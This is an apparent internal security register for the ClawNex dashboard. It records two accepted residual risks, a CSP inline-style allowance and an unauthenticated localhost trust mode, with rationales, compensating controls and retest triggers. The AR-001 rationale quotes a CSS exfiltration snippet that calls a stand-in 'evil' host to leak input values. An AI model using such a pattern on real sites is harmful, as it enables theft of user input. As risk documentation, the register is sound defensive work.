# ClawNex Accepted-Residual Security Findings

**Purpose.** A citable register of security findings that ClawNex has
consciously accepted as residual risk rather than remediated. Each
entry names the residual, the rationale, the compensating controls
that bound the residual blast radius, and the explicit condition that
would force a retest / re-evaluation.

**Status.** This is the canonical "open accepted residuals" surface.
A finding belongs here only AFTER explicit owner sign-off, not as a
parking lot for un-triaged work. If a residual ages past 12 months
without re-evaluation, it MUST be re-triaged regardless of whether
the retest condition has fired.

**Owner.** Project owner.

---

## AR-001 — CSP `style-src-attr 'unsafe-inline'`

| Field | Value |
|---|---|
| Severity (DAST classification) | MEDIUM (defense-in-depth gap, no live exploit) |
| First observed | 2026-05-14 (DAST Round 15, H2) — closed for the element-injection vector; attribute-level retained |
| Re-flagged | 2026-05-15 (DAST Round 2 comprehensive assessment) |
| Accepted by | Project owner, 2026-05-15 |
| Linked risk-register row | [R-036 (closed, with retained-clause rationale)](../registers/risk-register.md) |
| Implementation file | `src/middleware.ts` — `buildCspWithNonce()` (`style-src-attr 'unsafe-inline'` line) |

### The finding

ClawNex's Content-Security-Policy includes
`style-src-attr 'unsafe-inline'`. The CSP3 `-attr` variant permits
inline `style="..."` attributes on HTML elements. A pure `style-src`
parser without CSP3 support would degrade to the unsafe-inline
allowance on the `style-src` fallback line.

### Rationale for acceptance

1. **What the residual permits.** Only inline `style="..."` attributes
   on elements that have already been rendered into the document. This
   does NOT permit `<style>` element injection (closed by
   `style-src-elem 'self'`) or `<link rel="stylesheet">` to off-origin
   hosts (closed by `style-src-elem 'self'`).

2. **What attacker capability is required for this residual to matter.**
   The attacker must already have HTML injection into a location where
   React would otherwise escape attribute values. That is an XSS-class
   bug, not a CSS-injection bug. CSP at the `style-src-attr` layer is
   the *last* defense after React's attribute encoding has already
   failed — every other CSP layer (including `script-src 'self'
   'nonce-...' 'strict-dynamic'`) is still enforcing.

3. **What the CSS-attribute-selector exfiltration class needs.** The
   `<style>` exfil vector that DAST originally flagged (CSS attribute
   selectors leaking input values one character at a time via
   `background: url(https://evil/leak?c=a)`) requires injecting a
   `<style>` block, NOT an attribute. That vector is **closed** by
   `style-src-elem 'self'`.

4. **Cost of eliminating the residual.** ~3169 React `style={{...}}`
   attribute callsites across `src/`. Migrating each to either a
   className-based approach (Tailwind utility) or a `<style nonce>`
   pattern is a structural codebase change spanning every visual
   component. The work is well-defined and tracked, but is its own
   work package, not an incremental fix.

### Compensating controls (still active)

- `script-src 'self' 'nonce-<per-request>' 'strict-dynamic'` — every
  inline `<script>` requires the per-request nonce. No `'unsafe-inline'`.
- `style-src-elem 'self'` — `<style>` element injection blocked.
- `frame-ancestors 'none'` — no clickjacking vector.
- `base-uri 'self'` — `<base href>` injection blocked.
- React's default attribute encoding — the only way to inject a
  `style=` attribute is via the React `style={{...}}` prop, which
  serializes a known object shape.

### Retest condition

This residual is re-triaged immediately when ANY of these fire:

1. **Codebase migration.** When the React `style={{...}}` callsite
   count (`grep -rc 'style={{' src/` excluding `node_modules` and
   generated files) drops below 50, evaluate dropping
   `style-src-attr 'unsafe-inline'` entirely.

2. **CSP4 + browser support.** When `style-src-attr` supports
   `'nonce-<value>'` or `'unsafe-hashes'` with the right hash
   shape AND target-browser coverage for ClawNex's operator pool
   exceeds 95%, switch from `'unsafe-inline'` to the hashed/nonced
   form.

3. **Adversarial-class change.** If a new attribute-only CSS exfil
   class is published (e.g. attribute-level `url()` loading without
   a `<style>` block — currently not a known shape), this residual
   loses its rationale and must be reassessed within 14 days.

4. **Annual rotation.** If 2027-05-15 arrives and none of the above
   has fired, re-evaluate anyway.

### Evidence

- `scripts/verify-csp-style-src.sh` — static + live verifier guards
  the CSP shape (asserts `style-src`/`style-src-elem` do NOT carry
  `'unsafe-inline'`; asserts `style-src-attr` does retain it; asserts
  rendered HTML emits zero `<style>` tags).
- `docs/qa/dast-remediation-2026-05-14.md` §6 — H2 closure narrative.
- `docs/registers/risk-register.md` R-036 — closed-with-retained-clause
  entry.

---

## AR-002 — Pattern-B same-host trust (RBAC-off localhost mode)

| Field | Value |
|---|---|
| Severity (DAST classification) | HIGH (no authentication on data + mutation routes from localhost when RBAC is off) |
| First observed | 2026-05-15 (DAST Round 2, H8) |
| Accepted by | Project owner, 2026-05-15 |
| Linked risk-register row | R-039 (Pattern-B same-host trust boundary) |
| Implementation file | `src/lib/middleware/localhost-guard.ts` — `requireLocalhost()`; route-level Pattern-B branches across `src/app/api/**/route.ts` |

### The finding

When `RBAC_ENABLED=false`, ClawNex's API routes follow the "Pattern-B"
trust model:

```ts
if (isRbacEnabled()) {
  const auth = requireSession(request);
  // ... RBAC path
} else {
  const guard = requireLocalhost(request);  // <-- Pattern B
  if (guard) return guard;
}
```

`requireLocalhost` enforces (a) loopback IP / loopback bind and
(b) cross-origin refusal on mutating methods. It does **not** require
a per-caller authentication token. Any process running on the same
host as the dashboard process — under the same operating-system user
account — can issue arbitrary GET/POST/PATCH/DELETE against
`/api/*` and receive 200 responses.

DAST runs the scanner from the same host and observes 18 data routes
+ all mutation routes responding without an auth challenge. That is
the literal observable behavior the scanner flags.

### Rationale for acceptance

1. **The trust model is "same uid = trusted."** Pattern-B's design
   premise is the local-first developer / single-operator install:
   the operator is also the host. Any process the operator could
   start as themselves (curl, python, a node script, a malicious
   binary already smuggled into the user's account) is already at
   the same privilege boundary as the dashboard. There is no
   in-process defense that can stop a sibling process running as the
   same OS user from reading the dashboard's own memory, files, or
   sockets.

2. **What attacker capability is required for this residual to
   matter.** The attacker must already have code execution as the
   same uid that owns the ClawNex install. With that capability the
   attacker can: read `~/clawnex/.env.local` (which has the SESSION,
   SETUP, INGEST, and LITELLM secrets at chmod 600 same-uid-readable),
   read `~/clawnex/clawnex.db` directly (same uid), or simply
   `kill <pid>` the dashboard and replace its binary. Adding an
   API token check does not raise the bar; the attacker is already
   inside the trust boundary.

3. **Counterfactual: what would "closing" this look like?** A
   localhost-only token shipped via Set-Cookie can be acquired by
   any same-uid process running `curl http://127.0.0.1:5001/`. A
   unix-socket bind with chmod 600 still allows same-uid clients to
   connect. SO_PEERCRED / SO_PEERPID checks confirm the peer uid,
   which by premise is the same uid. None of these primitives raise
   the security bar above zero against a same-uid attacker.

4. **Where the trust boundary actually exists.** For multi-operator,
   shared-host, or network-reachable deployments, the operator must
   enable RBAC (`RBAC_ENABLED=true`). That switches every Pattern-B
   route to `requireSession` + permission checks against an
   operator-table row. `scripts/deploy-prod.sh` defaults
   `RBAC_ENABLED=true` for production deploys precisely so this
   residual cannot apply to a network-reachable host.

### Compensating controls (still active)

- `requireLocalhost`: refuses remote IPs (when `request.ip` is
  populated) AND refuses non-loopback `HOSTNAME`/`HOST` bind in
  production NODE_ENV. A network-reachable host without RBAC enabled
  fails closed.
- `validateOriginMatch` (called from `requireLocalhost` for mutating
  methods): refuses cross-origin POST/PATCH/DELETE/PUT, blocking
  browser-side CSRF from `evil.com`.
- DB file perms 600 (DAST 2026-05-15 H2 + Run 2 H2 follow-up): the
  same-uid attacker can read the DB directly, but other host users
  cannot.
- Audit log: every Pattern-B mutation is audit-logged with the
  literal actor `'localhost'`, so any same-uid abuse is at least
  recorded.
- `scripts/deploy-prod.sh` hard-codes `RBAC_ENABLED=true` for the
  production deploy path. Pattern-B is a development affordance,
  not a production posture.
- Dashboard UI surfaces (multiple): `ReadinessBanner` shows amber
  "RBAC disabled (localhost-only)" banner; `FleetCommandPanel`
  RBAC card shows "RBAC OFF / re-run setup.sh"; mission-control
  Phase 6 producer emits "RBAC is disabled — all routes
  default-allow" triage row. An operator cannot miss the warning.

### Retest condition

This residual is re-triaged immediately when ANY of these fire:

1. **Threat-model change.** A documented shared-host deployment
   scenario emerges where same-uid trust is no longer acceptable
   (e.g. ClawNex on a multi-tenant container host, or in a sandbox
   where multiple workloads share the same uid). At that point
   Pattern-B is retired entirely; RBAC becomes mandatory.

2. **New same-uid attack class.** A published primitive that
   distinguishes a malicious same-uid process from the legitimate
   dashboard SPA (e.g. signed-process attestation, hardware-backed
   per-process keys with OS-level enforcement) becomes available
   on ClawNex's target operating systems.

3. **Default flip.** If the install/setup default for
   `RBAC_ENABLED` ever flips from `false` to `true` for non-prod
   installs as well, this residual narrows from "open by default
   in dev" to "open only in explicit override mode" and the
   rationale needs to be re-stated.

4. **Annual rotation.** If 2027-05-15 arrives and none of the
   above has fired, re-evaluate anyway.

### Evidence

- `src/lib/middleware/localhost-guard.ts` — the layered IP +
  bind + Origin check that bounds remote attackers.
- `scripts/deploy-prod.sh:482` — `RBAC_ENABLED=true` literal in
  the production deploy `.env.local` template.
- `src/components/dashboard/ReadinessBanner.tsx:82-83` — amber
  banner emitter for the RBAC-off state.
- `src/components/dashboard/panels/mission-control/phase6-producers.ts:402-410`
  — mission-control triage producer for the "RBAC is disabled"
  posture row.
- DAST 2026-05-15 Round 2 report — H8 finding evidence.

---

## Environment-limited DAST verification (NOT accepted residuals)

These are NOT accepted residual risks. They are controls that exist
and have been verified at the code layer, but were not exercised
end-to-end through the QA edge DAST because the QA environment
cannot construct the scenario the control defends. They are listed
here for discoverability — a future auditor reading the AR register
should not mistake the absence of a DAST result for the absence of
the control.

Each entry below names the control, the reason DAST cannot exercise
it on the current QA target, and the code-verification evidence.

| Control | Why not DAST-proven on QA | Code evidence |
|---|---|---|
| `requireLocalhost` host allowlist (Codex r2 #2 + r3 safe-method extension) | Targets RBAC-off mode. The QA target (`<qa-host>`) runs RBAC-on, so the guard's allowlist + DNS-rebinding GET coverage never fires on a session-cookie probe through Caddy. The control is a defense-in-depth layer for RBAC-off local-dev / self-hosted deployments. | `src/lib/auth/origin-match.ts`; `src/lib/middleware/localhost-guard.ts`; verifier `scripts/verify-origin-allowlist.ts` (16/16) |
| Provider DNS rebinding / write-time hostname allowlist (Codex r2 #3) | Requires a controlled hostile-DNS rig that resolves a target hostname to a public IP at save time and to a private / cloud-metadata IP at use time. Black-box DAST against a single QA endpoint cannot construct that rig. The control is a write-time allowlist (`PROVIDER_HOST_ALLOWLIST` + `TRUSTED_PROVIDER_HOSTS` env) that rejects any hostname not on either list BEFORE the DNS check, defeating the TOCTOU. | `src/lib/services/config-service.ts` `rejectIfWriteTargetUnsafe`; verifier `scripts/verify-provider-ssrf-write.ts` (16/16). Closes risk register R-037. |
| `/api/v1/chat/completions` sanitize+rebuild invariant (internal reviewer r4 BLOCKER + Codex r5) | API-key gated. The session-cookie DAST harness cannot reach the route's validator without a provisioned API key on the QA target, which would add evidence-handling and key-rotation complexity for a single regression. The dashboard chat path (`/api/chat`) uses the same shared sanitizer and is HTTP-verified on QA (see DAST Run 3 §7). | `src/app/api/v1/chat/completions/route.ts` + `src/lib/shield/sanitize-chat-payload.ts`; verifier `scripts/verify-chat-invariant.ts` (35/35) including a capture-mock that asserts upstream LiteLLM body shape. Closes risk register R-040. |

**These entries do NOT carry retest conditions like AR-001 / AR-002 because they are not accepted risks** — they are controls. They should be exercised end-to-end (1) when an API-key DAST harness is added, (2) when a hostile-DNS QA target is provisioned, or (3) when a RBAC-off QA target is provisioned alongside the existing RBAC-on staging host. Until then, the code + unit-verifier evidence is the authoritative proof.

---

## How to add a new accepted residual

A new entry MUST include all of:

- Severity (DAST classification)
- First-observed date + report
- Owner-of-record + acceptance date
- Linked risk-register row
- Implementation file (where the residual lives in code)
- Rationale (what the residual permits, what attacker capability is
  required, why elimination cost is non-trivial)
- Compensating controls
- Retest condition (at least one objective trigger, plus an annual
  rotation backstop)
- Evidence (verifier path + cross-links)

Entries without an objective retest condition will be rejected at
review.
